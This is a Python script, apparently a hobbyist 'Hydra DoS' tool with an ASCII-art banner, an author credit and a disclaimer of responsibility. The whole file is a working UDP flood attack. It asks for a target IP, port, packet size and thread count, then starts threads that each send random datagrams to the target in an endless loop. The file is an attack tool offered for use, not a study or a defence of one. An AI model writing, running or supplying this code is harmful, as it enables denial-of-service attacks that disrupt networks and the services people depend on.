import random
import socket
import time
import threading as th
Hydra = """\33[91m\33[47m
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0KWW00MMMMMMMMMMMMMM
MMMWKKNWNXXWMMWNNWMMMMMWNKK0kdooc;cOxo0MMMMMMMMMMMMM
MMNd...,;;;;:ccdKMMMMMMNOlc;'.     ...'dKWMMMMMMMMMM
MMWKkdc. ..    ':oOXWWKl.     ,ldoc'   .;lKMMMMMMMMM
MMMMMMWKl;cddc'   .lKN0c.    '0MMMMXl  .'.:KMMMMMMMM
MMMMMMMMWWWMMMXl.  .lKNl     .xWMMMM0:...  .c0WMMMMM
MMMMMMMMMMMMMMM0'   'kNo      .lKWMWK0XX0xc. cNMMMMM
MMMMMMMMMMMMMMMk.   'kW0ccc,    .;ldo::lodxxxKMMMMMM
MMMWWWMMMWMMMMX:   .lXMMX00kc.           .',lk0KNMMM
MMMXxx0kxOXWMWd.  .;kMMMNOdl,.       ':.       .oNMM
MMM0,.. ..,o0Xc  .lXWMMXo.    .ld;   ,OOc:ldxxlcxWMM
MWk,  .,.   ,x:  .dWMMW0;    'OWM0'   oWWNKO0kdKMMMM
M0;. .dWK;   co.  ;KMMMO'    '0MMK,   lX0l'....cKWMM
Kc..cxXMX;   :0l   ,kWMO.     .dXx.  .oO,  .:' .;OWM
0:cKWMMNo   ,xNNo.  .;xkold;    '.   .oc  .xW0:..,kN
MNWMMMMK,  .xWMMW0l.   .':ol'        ,Ol   :XWNKx;:0
MMMMMMMNc   ,kXWMMWXo.               oN0l.  lNMMMNXW
MMMMMMMMK:    .;cldxo.              cXMWO,  cNMMMMMM
MMMMMMMMMNx;.                      .lol;.  :KMMMMMMM
MMMMMWKxdONK:.                           .oXWMMMWNNW
XWXOKO:  .,:.                            .,;;lxOxool
ld:..,.                                        ..''.
    __  __          __              ____       _____
   / / / /_  ______/ /________ _   / __ \____ / ___/
  / /_/ / / / / __  / ___/ __ `/  / / / / __ \\__ \  
 / __  / /_/ / /_/ / /  / /_/ /  / /_/ / /_/ /__/ / 
/_/ /_/\__, /\__,_/_/   \__,_/  /_____/\____/____/  
      /____/                                        
"""

print(Hydra+"""\33[0m\33[91m
=======================================
Created By: HerobrinePE 
Channel: \33[4m https://www.youtube.com/c/HerobrinePE\33[0m\33[91m
\33[40m\33[92m
Using Too much Bytes can slow down internet speed depending on your internet connection
\33[41m Multi\33[0m\33[92m Threading can also make it slow 

**\33[1mI Am Not Responsible For Any Of Your Actions\33[0m\33[32m**
=======================================
""")
byteSize = int(input("\33[33mByte size=>"))
ip = input("\33[31mIP=> ")
port = int(input("\33[34mport=> "))
num = input("(  Threads  )\33[35m=> \33[91m")
tme = int(input("\33[94m Thread Delay (0-5 most Effective) (  Seconds  )=>"))
print('\x1bc')
print("\33[0;20H")
print(Hydra)
print ("\33[91m\33[104m Lunching Attack on "+str(ip)+" Port="+ str(port)+" Bytes="+str(byteSize)+" Threads="+str(num)+" \33[104m\33[0m")
def dos():
    sent = 0
    connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if connect:
        	while True:
        		bytes = random._urandom(byteSize)
        		connect.sendto((bytes), (ip, port))
        		sent = sent+1
        		print("\r\33[42m Bytes="+str(sent), sep="",end='\33[0m', flush=True)
for i in range(int(num)):
	time.sleep(tme)
	print("\r\33[42m				Threads Activated="+str(i+1), end="\33[0m ", flush=True)
	t = th.Thread(target=dos)
	t.start()
	
